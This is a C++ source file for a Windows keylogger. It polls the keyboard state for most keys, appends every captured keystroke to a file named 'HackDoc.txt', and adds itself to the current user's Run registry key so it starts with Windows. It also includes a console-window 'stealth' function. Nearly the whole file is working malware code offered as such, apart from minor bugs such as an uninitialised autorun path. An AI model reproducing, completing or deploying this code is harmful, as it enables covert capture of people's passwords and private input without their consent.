#include "basic_func.h"

/*******************************************************************/

/* Date: 10.06.2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright: 2018 Artem Gord1728. All rights reserved.            */

/* Description: Code with basic functionality                      */

/*******************************************************************/

using std::fstream;
using std::ofstream;
using std::cout;



void K_Logger::WriteToDoc(LPCSTR text)
{
	std::ofstream doc_to;

	doc_to.open("HackDoc.txt", fstream::app);
	doc_to << text;
	doc_to.close();
}

int K_Logger::SaveSymbol(WORD iKey)
{
	switch (iKey)
	{
	case VK_SCROLL:
		cout << " *SCROLL* ";
		WriteToDoc("");
		break;

	case 48:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << ")";
			WriteToDoc(")");
		}
		else
		{
			cout << "0";
			WriteToDoc("0");
		}
		break;

	case 49:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_LSHIFT))
		{
			cout << "!";
			WriteToDoc("!");
		}
		else
		{
			cout << "1";
			WriteToDoc("1");
		}
		break;

	case 50:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "@";
			WriteToDoc("@");
		}
		else
		{
			cout << "2";
			WriteToDoc("2");
		}
		break;

	case 51:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "#";
			WriteToDoc("#");
		}
		else
		{
			cout << "3";
			WriteToDoc("3");
		}
		break;

	case 52:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "$";
			WriteToDoc("$");
		}
		else
		{
			cout << "4";
			WriteToDoc("4");
		}
		break;

	case 53:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "%";
			WriteToDoc("%");
		}
		else
		{
			cout << "5";
			WriteToDoc("5");
		}
		break;

	case 54:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "^";
			WriteToDoc("^");
		}
		else
		{
			cout << "6";
			WriteToDoc("6");
		}
		break;

	case 55:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "&";
			WriteToDoc("&");
		}
		else
		{
			cout << "7";
			WriteToDoc("7");
		}
		break;

	case 56:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "*";
			WriteToDoc("*");
		}
		else
		{
			cout << "8";
			WriteToDoc("8");
		}
		break;

	case 57:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "(";
			WriteToDoc("(");
		}
		else
		{
			cout << "9";
			WriteToDoc("9");
		}
		break;

	case 65:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "A";
			WriteToDoc("A");
		}
		else
		{
			cout << "a";
			WriteToDoc("a");
		}
		break;

	case 66:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "B";
			WriteToDoc("B");
		}
		else
		{
			cout << "b";
			WriteToDoc("b");
		}
		break;

	case 67:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "C";
			WriteToDoc("C");
		}
		else
		{
			cout << "c";
			WriteToDoc("c");
		}
		break;

	case 68:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "D";
			WriteToDoc("D");
		}
		else
		{
			cout << "d";
			WriteToDoc("d");
		}
		break;

	case 69:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "E";
			WriteToDoc("E");
		}
		else
		{
			cout << "e";
			WriteToDoc("e");
		}
		break;

	case 70:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "F";
			WriteToDoc("F");
		}
		else
		{
			cout << "f";
			WriteToDoc("f");
		}
		break;

	case 71:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "G";
			WriteToDoc("G");
		}
		else
		{
			cout << "g";
			WriteToDoc("g");
		}
		break;

	case 72:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "H";
			WriteToDoc("H");
		}
		else
		{
			cout << "h";
			WriteToDoc("h");
		}
		break;

	case 73:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "I";
			WriteToDoc("I");
		}
		else
		{
			cout << "i";
			WriteToDoc("i");
		}
		break;

	case 74:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "J";
			WriteToDoc("J");
		}
		else
		{
			cout << "j";
			WriteToDoc("j");
		}
		break;


	case 75:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "K";
			WriteToDoc("K");
		}
		else
		{
			cout << "k";
			WriteToDoc("k");
		}
		break;


	case 76:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "L";
			WriteToDoc("L");
		}
		else
		{
			cout << "l";
			WriteToDoc("l");
		}
		break;

	case 77:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "M";
			WriteToDoc("M");
		}
		else
		{
			cout << "m";
			WriteToDoc("m");
		}
		break;


	case 78:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "N";
			WriteToDoc("N");
		}
		else
		{
			cout << "n";
			WriteToDoc("n");
		}
		break;

	case 79:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "O";
			WriteToDoc("O");
		}
		else
		{
			cout << "o";
			WriteToDoc("o");
		}
		break;

	case 80:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "P";
			WriteToDoc("P");
		}
		else
		{
			cout << "p";
			WriteToDoc("p");
		}
		break;

	case 81:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "Q";
			WriteToDoc("Q");
		}
		else
		{
			cout << "q";
			WriteToDoc("q");
		}
		break;

	case 82:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "R";
			WriteToDoc("R");
		}
		else
		{
			cout << "r";
			WriteToDoc("r");
		}
		break;

	case 83:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "S";
			WriteToDoc("S");
		}
		else
		{
			cout << "s";
			WriteToDoc("s");
		}
		break;

	case 84:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "T";
			WriteToDoc("T");
		}
		else
		{
			cout << "t";
			WriteToDoc("t");
		}
		break;

	case 85:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "U";
			WriteToDoc("U");
		}
		else
		{
			cout << "u";
			WriteToDoc("u");
		}
		break;

	case 86:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "V";
			WriteToDoc("V");
		}
		else
		{
			cout << "v";
			WriteToDoc("v");
		}
		break;

	case 87:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "W";
			WriteToDoc("W");
		}
		else
		{
			cout << "w";
			WriteToDoc("w");
		}
		break;

	case 88:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "X";
			WriteToDoc("X");
		}
		else
		{
			cout << "x";
			WriteToDoc("x");
		}
		break;

	case 89:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "Y";
			WriteToDoc("Y");
		}
		else
		{
			cout << "y";
			WriteToDoc("y");
		}
		break;

	case 90:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			cout << "Z";
			WriteToDoc("Z");
		}
		else
		{
			cout << "z";
			WriteToDoc("z");
		}
		break;




	case VK_F1:
		cout << "  *F1*  ";
		WriteToDoc("  *F1*  ");
		break;

	case VK_F2:
		cout << "  *F2*  ";
		WriteToDoc("  *F2*  ");
		break;

	case VK_F3:
		cout << "  *F3*  ";
		WriteToDoc("  *F3*  ");
		break;

	case VK_F4:
		cout << "  *F4*  ";
		WriteToDoc("  *F4*  ");
		break;

	case VK_F5:
		cout << "  *F5*  ";
		WriteToDoc("  *F5*  ");
		break;

	case VK_F6:
		cout << "  *F6*  ";
		WriteToDoc("  *F6*  ");
		break;

	case VK_F7:
		cout << "  *F7*  ";
		WriteToDoc("  *F7*  ");
		break;

	case VK_F8:
		cout << "  *F8*  ";
		WriteToDoc("  *F8*  ");
		break;

	case VK_F9:
		cout << "  *F9*  ";
		WriteToDoc("  *F9*  ");
		break;

	case VK_F10:
		cout << "  *F10*  ";
		WriteToDoc("  *F10*  ");
		break;

	case VK_F11:
		cout << "  *F11*  ";
		WriteToDoc("  *F11*  ");
		break;

	case VK_F12:
		cout << "  *F12*  ";
		WriteToDoc("  *F12*  ");
		break;

	case VK_END:
		cout << "  *END*  ";
		WriteToDoc("  *END*  ");
		break;

	case VK_HOME:
		cout << "  *HOME*  ";
		WriteToDoc("  *HOME*  ");
		break;

	case VK_NUMLOCK:
		cout << "  *Num_Lock*  ";
		WriteToDoc("  *Num_Lock*  ");
		break;

	case VK_RWIN:
		cout << "  *Right_Windows*  ";
		WriteToDoc("  *Right_Windows*  ");
		break;





		//+-+-+-+-+-+All figures below are NUMPAD-+-+-+-+-+
		//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	case VK_NUMPAD0:
		cout << "0";
		WriteToDoc("0");
		break;

	case VK_NUMPAD1:
		cout << "1";
		WriteToDoc("1");
		break;

	case VK_NUMPAD2:
		cout << "2";
		WriteToDoc("2");
		break;

	case VK_NUMPAD3:
		cout << "3";
		WriteToDoc("3");
		break;

	case VK_NUMPAD4:
		cout << "4";
		WriteToDoc("4");
		break;

	case VK_NUMPAD5:
		cout << "5";
		WriteToDoc("5");
		break;

	case VK_NUMPAD6:
		cout << "6";
		WriteToDoc("6");
		break;

	case VK_NUMPAD7:
		cout << "7";
		WriteToDoc("7");
		break;

	case VK_NUMPAD8:
		cout << "8";
		WriteToDoc("8");
		break;

	case VK_NUMPAD9:
		cout << "9";
		WriteToDoc("9");
		break;

	case VK_DECIMAL:
		cout << ".";
		WriteToDoc(".");
		break;

	case VK_SUBTRACT:
		cout << "-";
		WriteToDoc("-");
		break;

	case VK_MULTIPLY:
		cout << "*";
		WriteToDoc("*");
		break;

	case VK_DIVIDE:
		cout << "/";
		WriteToDoc("/");
		break;

	case VK_ADD:
		cout << "+";
		WriteToDoc("+");
		break;
		//+-+-+-+-+-+-+-+--+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	   //+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+



	case VK_LWIN:
		cout << " Left_Win ";
		WriteToDoc(" Left_Win ");
		break;


	case VK_SPACE:
		cout << " ";
		WriteToDoc(" ");
		break;

	case VK_TAB:
		cout << " *TAB* ";
		WriteToDoc(" *TAB* ");
		break;

	case VK_MBUTTON:
		cout << "  *mouse_middle-button*  ";
		WriteToDoc("  *mouse_middle-button*  ");
		break;

	case VK_MENU:
		cout << "  *Left_ALT*  ";
		WriteToDoc("  *Left_ALT*  ");
		break;

	case VK_SNAPSHOT:
		cout << "  *PRINT_SCREEN*  ";
		WriteToDoc("  *PRINT_SCREEN*  ");
		break;

	case VK_CAPITAL:
		cout << "  *CAPS_LOCK*  ";
		WriteToDoc("  *CAPS_LOCK*  ");
		break;

	case VK_RETURN:
		cout << "\n";
		WriteToDoc("\n");
		break;

	case VK_SHIFT:
		cout << " *Left_Shift* ";
		WriteToDoc(" *Left_Shift* ");
		break;

	case VK_RSHIFT:
		cout << " *Right_Shift* ";
		WriteToDoc(" *Right_Shift* ");
		break;

	case VK_BACK:
		cout << "\b";
		WriteToDoc("\b");
		break;

	case VK_PRIOR:
		cout << "  *PageUp*  ";
		WriteToDoc("  *PageUp*  ");
		break;

	case VK_NEXT:
		cout << "  *PageDown*  ";
		WriteToDoc("  *PageDown*  ");
		break;

	case VK_ESCAPE:
		cout << " *Esc* ";
		WriteToDoc(" *Esc* ");
		break;

	case VK_UP:
		cout << " btn_up ";
		WriteToDoc(" btn_up ");
		break;

	case VK_DOWN:
		cout << " btn_down ";
		WriteToDoc(" btn_down ");
		break;

	case VK_LEFT:
		cout << " btn_left ";
		WriteToDoc(" btn_left ");
		break;

	case VK_RIGHT:
		cout << " btn_right ";
		WriteToDoc(" btn_right ");
		break;

	case VK_CONTROL:
		cout << " btn_ctrl ";
		WriteToDoc(" btn_ctrl ");
		break;

	case VK_INSERT:
		cout << " Insert ";
		WriteToDoc(" Insert ");
		break;

	case VK_DELETE:
		cout << " *Delete* ";
		WriteToDoc(" Delete ");
		break;


	case VK_RBUTTON:
		cout << " *mouse_right *";
		WriteToDoc(" *mouse_right* ");
		break;

	case VK_LBUTTON:
		cout << " *mouse_left* ";
		WriteToDoc(" *mouse_left* ");
		break;

	default:
		cout << "?";
		WriteToDoc("?");
		break;
	}
	return 0;
}

void K_Logger::VisibilityApp()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindow", NULL);
	ShowWindow(stealth, 1);
}

void K_Logger::AddToAutorun()
{
	HKEY registryKey;
	char sizeReg[0x100];

	RegCreateKeyEx(HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		NULL,
		nullptr,
		REG_OPTION_NON_VOLATILE,
		KEY_SET_VALUE, nullptr,
		&registryKey, nullptr);


	if (registryKey)
	{
		RegSetValueEx(registryKey, "Logger", NULL, REG_SZ, (LPBYTE)sizeReg, strlen(sizeReg));
		RegCloseKey(registryKey);
	}
}



int main()
{
	setlocale(LC_ALL, "ru");

	char key;

	K_Logger kl;

	kl.AddToAutorun();

	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 250; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				kl.SaveSymbol(key);
			}
		}
	}
	system("pause");
	return(0);
}